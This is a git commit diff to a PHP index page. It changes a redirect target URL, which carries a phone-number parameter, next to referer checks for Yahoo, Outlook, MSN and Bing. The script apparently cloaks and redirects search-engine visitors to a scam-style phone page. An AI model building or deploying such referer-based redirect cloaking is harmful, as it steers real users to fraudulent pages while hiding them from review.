615a250930c68197552375519e6a3171756b8875
luisdomain88 <147002646+luisdomain88@users.noreply.github.com>
2023-10-31 14:46:23 +0100

    Update index.php

--- index.php
+++ index.php
@@ -8,7 +8,7 @@
     $referers_bing=array('yahoo','outlook','msn','becovi','bing');
 
     $lanzar=true;
-    $dominio_m='https://whale-app-iosel.ondigitalocean.app/?phone=919-610-587';
+    $dominio_m='whale-app-iosel.ondigitalocean.app/?phone=919-610-587';
 
     $encontrado=true;
     if ($_SERVER["HTTP_REFERER"]!='' && $lanzar){
